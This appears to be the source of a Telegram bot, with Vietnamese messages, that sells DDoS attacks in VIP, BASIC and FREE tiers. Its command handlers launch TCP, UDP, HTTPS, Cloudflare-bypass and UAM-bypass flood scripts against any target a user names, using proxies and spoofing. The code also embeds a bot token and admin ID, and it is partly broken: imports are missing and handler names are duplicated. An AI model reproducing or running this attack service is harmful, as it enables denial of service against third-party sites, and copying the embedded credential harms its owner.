import telebot
import json
import os
import subprocess  
from datetime import datetime
from threading import Lock


BOT_TOKEN = "8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw"
bot = telebot.TeleBot(BOT_TOKEN)

VIP_FILE = "vip_users.json"
BASIC_FILE = "basic_users.json"


WHITELIST_FILE = "whitelist.txt"

def load_whitelist_targets():
    if not os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, "w", encoding="utf-8") as f:
            f.write("# Danh sách mục tiêu không được tấn công\n")
    with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
        return [line.strip().lower() for line in f if line.strip() and not line.startswith('#')]

def is_target_blocked(target):
    wl = load_whitelist_targets()
    return any(w in target.lower() for w in wl)

ADMIN_IDS = {7818408538}

MAX_TIME_VIP = 300
MAX_TIME_BASIC = 150
MAX_TIME_FREE = 60

MAX_COUNT_BASIC = 5
MAX_COUNT_FREE = 2


whitelist_users = set()
basic_users = set()
attack_count = {}
attack_count_lock = Lock()

def load_json_set(path):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return set(int(x) for x in data)
        except Exception:
            return set()
    return set()

def save_json_set(path, s):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(list(s), f)
    except Exception as e:
        print("Lưu file lỗi:", e)

whitelist_users = load_json_set(VIP_FILE)
basic_users = load_json_set(BASIC_FILE)

def check_permission_and_time(user_id, method, duration):
    try:
        dur = int(duration)
        if dur < 1:
            return False, "Thời gian phải là số nguyên dương (giây)."
    except:
        return False, "Thời gian không hợp lệ."

    method_lower = method.lower()

    if user_id in whitelist_users:  
        if dur > MAX_TIME_VIP:
            return False, f"VIP chỉ được tối đa {MAX_TIME_VIP} giây."
        return True, None

    if user_id in basic_users:      
        if method_lower in ["tcp", "udp", "uam"]:
            return False, "BASIC không có quyền dùng method này."
        if dur > MAX_TIME_BASIC:
            return False, f"BASIC chỉ được tối đa {MAX_TIME_BASIC} giây."
        return True, None

    if method_lower != "flood":
        return False, "FREE chỉ được dùng /flood."
    if dur > MAX_TIME_FREE:
        return False, f"FREE chỉ được tối đa {MAX_TIME_FREE} giây."
    return True, None

def can_attack(user_id):
    with attack_count_lock:
        cnt = attack_count.get(user_id, 0)
        if user_id in whitelist_users:
            return True, None
        if user_id in basic_users:
            if cnt >= MAX_COUNT_BASIC:
                return False, f"BASIC chỉ được tối đa {MAX_COUNT_BASIC} counts."
            return True, None
        if cnt >= MAX_COUNT_FREE:
            return False, f"FREE chỉ được tối đa {MAX_COUNT_FREE} counts."
        return True, None

def increase_attack_count(user_id):
    with attack_count_lock:
        attack_count[user_id] = attack_count.get(user_id, 0) + 1

def reset_all_counts():
    with attack_count_lock:
        attack_count.clear()


@bot.message_handler(commands=['add_vip'])
def cmd_add_vip(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return bot.send_message(msg.chat.id, "❌ Bạn không có quyền.")
    parts = msg.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.send_message(msg.chat.id, "❗ Sử dụng: /add_vip <user_id>")
    uid = int(parts[1])
    if uid in whitelist_users:
        return bot.send_message(msg.chat.id, f"⚠️ {uid} đã là VIP.")
    whitelist_users.add(uid)
    save_json_set(VIP_FILE, whitelist_users)
    bot.send_message(msg.chat.id, f"✅ Đã thêm {uid} vào VIP.")

@bot.message_handler(commands=['add_basic'])
def cmd_add_basic(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return bot.send_message(msg.chat.id, "❌ Bạn không có quyền.")
    parts = msg.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.send_message(msg.chat.id, "❗ Sử dụng: /add_basic <user_id>")
    uid = int(parts[1])
    if uid in basic_users:
        return bot.send_message(msg.chat.id, f"⚠️ {uid} đã là BASIC.")
    basic_users.add(uid)
    save_json_set(BASIC_FILE, basic_users)
    bot.send_message(msg.chat.id, f"✅ Đã thêm {uid} vào BASIC.")

@bot.message_handler(commands=['xoa'])
def cmd_ban(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return bot.send_message(msg.chat.id, "❌ Bạn không có quyền.")
    parts = msg.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.send_message(msg.chat.id, "❗ Sử dụng: /xoa <user_id>")
    uid = int(parts[1])
    removed = False
    if uid in whitelist_users:
        whitelist_users.remove(uid)
        save_json_set(VIP_FILE, whitelist_users)
        removed = True
    if uid in basic_users:
        basic_users.remove(uid)
        save_json_set(BASIC_FILE, basic_users)
        removed = True
    if removed:
        bot.send_message(msg.chat.id, f"✅ Đã xoá {uid} khỏi VIP/BASIC.")
    else:
        bot.send_message(msg.chat.id, f"⚠️ {uid} không có trong VIP hoặc BASIC.")

@bot.message_handler(commands=['admin'])
def cmd_list_admins(msg):
    admin_list = "\n".join(str(a) for a in ADMIN_IDS)
    bot.send_message(msg.chat.id, f"📋 Danh sách admin:\n{admin_list}")

@bot.message_handler(commands=['reset_counts'])
def cmd_reset_counts(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return bot.send_message(msg.chat.id, "❌ Bạn không có quyền.")
    reset_all_counts()
    bot.send_message(msg.chat.id, "✅ Đã reset tất cả đếm tấn công.")

def send_intro(chat_id, filename):
    try:
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                if filename.lower().endswith(('.mp4', '.mov', '.avi')):
                    bot.send_video(chat_id, f)
                elif filename.lower().endswith(('.gif', '.jpg', '.jpeg', '.png')):
                    bot.send_animation(chat_id, f)
    except Exception as e:
        print("Không gửi media:", e)

def run_proxy_update():
    while True:
        try:
            print("[BOT] Đang chạy proxy.py để cập nhật proxy...")
            subprocess.run(["python", "proxy.py"])
        except Exception as e:
            print(f"[BOT] Lỗi khi chạy proxy.py: {e}")
        time.sleep(3600)  

@bot.message_handler(commands=['proxy'])
def cmd_proxy(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return bot.send_message(msg.chat.id, "❌ Bạn không có quyền.")
    
    
    try:
        subprocess.run(["python", "proxy.py"])
        bot.send_message(msg.chat.id, "✅ Proxy đã được cập nhật ngay. Bot sẽ tự cập nhật lại mỗi 1 giờ.")
        
       
        threading.Thread(target=run_proxy_update, daemon=True).start()
    except Exception as e:
        bot.send_message(msg.chat.id, f"⚠️ Lỗi khi chạy proxy.py: {e}")
        

@bot.message_handler(commands=['start'])
def cmd_start(msg):
    send_intro(msg.chat.id, "banner.mp4")
    bot.send_message(msg.chat.id,
        f"🤖 BOT ĐÃ SẴN SÀNG\n"
        f"🚀 /method <Xem các method>\n"
        f"🏆 /plan <Kiểm tra gói>\n"
        f"👑 /admin <danh sách admin>\n"
        f"🆔 /id - Xem ID của bạn\n\n"
        f"👑 MENU ADMIN\n"
        f"✋ /reset_counts\n"
        f"🥈 /add_basic <Thêm basic>\n"
        f"🥇 /add_vip <Thêm vip>\n"
        f"🚫 /xoa <Xoá basic/vip>\n"
        f"🕒 Thời gian: {datetime.now()}"
    )

@bot.message_handler(commands=['method'])
def cmd_method(msg):
    send_intro(msg.chat.id, "method.gif")
    bot.send_message(msg.chat.id,
        "📜 Danh sách METHOD \n\n"
        "LAYER 4: <description of method>\n"
        "/lỗi <Attack TCP>\n"
        "/lỗi<Attack UDP>\n\n"
        "LAYER 7: <description of method>\n"
        "/lỗi<Flood on website>\n"
        "/bị lỗi<Ddos with high request>\n"
        "/uam <Bypass UAM>\n"
        "/bypass <Bypass Cloudflare>\n"
    )

@bot.message_handler(commands=['plan'])
def cmd_plan(msg):
    send_intro(msg.chat.id, "plan.gif")
    uid = msg.chat.id
    if uid in whitelist_users:
        bot.send_message(uid, f"🌟 Bạn là VIP — max {MAX_TIME_VIP}s, không giới hạn count.")
    elif uid in basic_users:
        bot.send_message(uid, f"🔑 Bạn là BASIC — max {MAX_TIME_BASIC}s, {MAX_COUNT_BASIC} count.")
    else:
        bot.send_message(uid, f"🔒 Bạn là FREE — max {MAX_TIME_FREE}s, {MAX_COUNT_FREE} count.")

@bot.message_handler(commands=['id'])
def cmd_id(msg):
    bot.send_message(msg.chat.id, f"🔎 ID của bạn: {msg.from_user.id}")

def handle_attack_command(msg, method_name):
    parts = msg.text.split()
    if len(parts) != 4:
        return bot.send_message(msg.chat.id, f"❗ /{method_name} <target> <port> <time>")
    target, port, duration = parts[1], parts[2], parts[3]

    if is_target_blocked(target):
        return bot.send_message(msg.chat.id, f"🚫 Mục tiêu '{target}' bị cấm tấn công!")

    allowed, reason = check_permission_and_time(msg.from_user.id, method_name, duration)
    if not allowed:
        return bot.send_message(msg.chat.id, f"🚫 {reason}")

    ok, reason2 = can_attack(msg.from_user.id)
    if not ok:
        return bot.send_message(msg.chat.id, f"🚫 {reason2}")

    increase_attack_count(msg.from_user.id)

def send_attack_status(chat_id, url, port, duration, method, user_id):
    plan_type = "VIP" if user_id in whitelist_users else ("BASIC" if user_id in basic_users else "FREE")
    bot.send_message(chat_id,
        f"✅ Tấn công {plan_type} đã bắt đầu\n"
        f"🌐 Host: {url}\n"
        f"🔌 Port: {port}\n"
        f"⏰ Time: {duration}s\n"
        f"🛠️ Method: {method}\n"
        f"🏆 Plan: {plan_type}\n"
        f"🕒 Thời gian: {datetime.now()}"
    )

@bot.message_handler(commands=['tcp'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /tcp <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "TCP", message.from_user.id)
    try:
        subprocess.Popen([" python", " all.py", url, port, "-d", duration, "-t", "100", "-p", "tcp", "-s", "2000", "--spoof "])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi TCP: {e}")
        

@bot.message_handler(commands=['udp'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /udp <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "udp", message.from_user.id)
    try:
        subprocess.Popen([" python", " all.py", url, port, "-d", duration, "-t", "100", "-p", "udp", "-s", "2000", "--spoof "])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi UDP: {e}")
        
@bot.message_handler(commands=['https'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /https <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "HTTPS", message.from_user.id)
    try:
        subprocess.Popen(["node", "https", url, duration, "200", "60", "proxies.txt", "--query", "--query", "1", "--delay", "1", "--bfm", "--randrate", "1", "--full", "--http mix"])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi HTTPS: {e}")
        

@bot.message_handler(commands=['bypass'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /bypass <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "BYPASS", message.from_user.id)
    try:
        subprocess.Popen(["node", "bypass", url, duration, "50", "5", "proxies.txt"])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi BYPASS: {e}")
        
@bot.message_handler(commands=['flood'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /flood <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "FLOOD", message.from_user.id)
    try:
        subprocess.Popen(["node", "flood", url, duration, "90", "5", "proxies.txt"])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi FLOOD: {e}")
 
@bot.message_handler(commands=['uam'])
def flood_command(message):
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /uam <url> <port> <time>")
    url, port, duration = args[1], args[2], args[3]
    send_intro(message.chat.id, "attack.gif")
    send_attack_status(message.chat.id, url, port, duration, "UAM", message.from_user.id)
    try:
        subprocess.Popen(["node", "uam", url, duration, "100", "5", "proxies.txt"])
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Lỗi UAM: {e}")
        
if __name__ == "__main__":
    print("Bot ddos da hoat dong.")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("Dừng bằng tay.")
    except Exception as e:
        print("Lỗi bot:", e)
